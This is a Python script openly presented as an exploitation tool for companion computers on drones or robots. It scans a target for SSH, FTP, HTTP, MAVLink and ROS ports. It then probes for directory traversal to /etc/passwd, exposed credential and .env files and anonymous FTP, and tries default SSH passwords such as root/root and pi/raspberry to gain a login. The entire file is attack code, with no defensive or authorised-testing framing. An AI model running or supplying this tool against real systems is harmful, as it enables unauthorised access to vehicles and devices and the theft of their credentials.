#!/usr/bin/env python3
"""
Companion Computer Exploitation Script
Scans and exploits vulnerabilities in companion computer services
"""

import sys
import socket
import subprocess
import requests
from urllib.parse import urljoin

# Common ports for companion computer services
COMMON_PORTS = {
    'SSH': 22,
    'HTTP': 80,
    'HTTPS': 443,
    'FTP': 21,
    'RTSP': 554,
    'MAVLink': 14550,
    'ROS': 11311,
    'Companion Web': 3000,
}

def scan_ports(host, ports=None):
    """
    Scan companion computer for open ports
    
    Args:
        host: IP address or hostname
        ports: List of ports to scan (default: COMMON_PORTS values)
    
    Returns:
        Dictionary of {service: port} for open ports
    """
    if ports is None:
        ports = list(COMMON_PORTS.values())
    
    open_ports = {}
    
    print(f"[*] Scanning {host} for open ports...")
    
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            sock.close()
            
            if result == 0:
                # Find service name
                service_name = 'Unknown'
                for name, p in COMMON_PORTS.items():
                    if p == port:
                        service_name = name
                        break
                
                print(f"[+] Port {port} ({service_name}) is open")
                open_ports[service_name] = port
        except Exception as e:
            pass
    
    return open_ports

def check_http_vulnerabilities(host, port=80):
    """
    Check for common HTTP vulnerabilities
    
    Args:
        host: Host IP or hostname
        port: HTTP port
    
    Returns:
        List of vulnerabilities found
    """
    vulnerabilities = []
    base_url = f"http://{host}:{port}"
    
    print(f"[*] Checking HTTP vulnerabilities on {base_url}...")
    
    # Check for directory traversal
    try:
        response = requests.get(f"{base_url}/../../etc/passwd", timeout=3)
        if response.status_code == 200 and 'root:' in response.text:
            vulnerabilities.append("Directory traversal vulnerability")
            print("[!] Directory traversal vulnerability found")
    except:
        pass
    
    # Check for default credentials
    try:
        response = requests.get(f"{base_url}/admin", timeout=3)
        if response.status_code == 200:
            vulnerabilities.append("Admin panel accessible")
            print("[!] Admin panel accessible")
    except:
        pass
    
    # Check for exposed files
    exposed_files = ['.env', 'config.json', 'credentials.txt', 'backup.tar.gz']
    for file in exposed_files:
        try:
            response = requests.get(f"{base_url}/{file}", timeout=3)
            if response.status_code == 200:
                vulnerabilities.append(f"Exposed file: {file}")
                print(f"[!] Exposed file found: {file}")
        except:
            pass
    
    return vulnerabilities

def check_ftp_vulnerabilities(host, port=21):
    """
    Check for FTP vulnerabilities
    
    Args:
        host: Host IP or hostname
        port: FTP port
    
    Returns:
        List of vulnerabilities found
    """
    vulnerabilities = []
    
    print(f"[*] Checking FTP vulnerabilities on {host}:{port}...")
    
    try:
        import ftplib
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=3)
        ftp.login()  # Anonymous login
        vulnerabilities.append("Anonymous FTP login enabled")
        print("[!] Anonymous FTP login enabled")
        ftp.quit()
    except ftplib.error_perm:
        pass
    except Exception as e:
        pass
    
    return vulnerabilities

def exploit_ssh(host, port=22, username='root', password='root'):
    """
    Attempt SSH login
    
    Args:
        host: Host IP or hostname
        port: SSH port
        username: Username to try
        password: Password to try
    
    Returns:
        True if login successful
    """
    print(f"[*] Attempting SSH login to {host}:{port}...")
    
    try:
        import paramiko
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password, timeout=5)
        print(f"[+] SSH login successful! Username: {username}, Password: {password}")
        ssh.close()
        return True
    except ImportError:
        print("[!] paramiko not installed. Install with: pip install paramiko")
        return False
    except Exception as e:
        print(f"[-] SSH login failed: {e}")
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 companion_computer_exploit.py <host> [port]")
        print("\nArguments:")
        print("  host    IP address or hostname of companion computer")
        print("  port    Specific port to check (optional, scans all if not specified)")
        print("\nExamples:")
        print("  python3 companion_computer_exploit.py 192.168.13.1")
        print("  python3 companion_computer_exploit.py 192.168.13.1 3000")
        sys.exit(1)
    
    host = sys.argv[1]
    specific_port = int(sys.argv[2]) if len(sys.argv) > 2 else None
    
    print(f"[*] Companion Computer Exploitation Tool")
    print(f"[*] Target: {host}")
    print()
    
    # Scan ports
    if specific_port:
        open_ports = scan_ports(host, [specific_port])
    else:
        open_ports = scan_ports(host)
    
    if not open_ports:
        print("[-] No open ports found")
        sys.exit(1)
    
    print(f"\n[+] Found {len(open_ports)} open service(s)")
    print()
    
    # Check vulnerabilities
    all_vulnerabilities = []
    
    # Check HTTP
    if 'HTTP' in open_ports or 'Companion Web' in open_ports:
        port = open_ports.get('HTTP', open_ports.get('Companion Web', 80))
        vulns = check_http_vulnerabilities(host, port)
        all_vulnerabilities.extend(vulns)
    
    # Check FTP
    if 'FTP' in open_ports:
        vulns = check_ftp_vulnerabilities(host, open_ports['FTP'])
        all_vulnerabilities.extend(vulns)
    
    # Check SSH
    if 'SSH' in open_ports:
        # Try common credentials
        common_creds = [
            ('root', 'root'),
            ('admin', 'admin'),
            ('pi', 'raspberry'),
            ('ubuntu', 'ubuntu'),
        ]
        for user, pwd in common_creds:
            if exploit_ssh(host, open_ports['SSH'], user, pwd):
                all_vulnerabilities.append(f"SSH access with {user}:{pwd}")
                break
    
    # Summary
    print("\n" + "="*50)
    print("VULNERABILITY SUMMARY")
    print("="*50)
    if all_vulnerabilities:
        for vuln in all_vulnerabilities:
            print(f"[!] {vuln}")
    else:
        print("[*] No obvious vulnerabilities found")
    
    sys.exit(0)

if __name__ == "__main__":
    main()
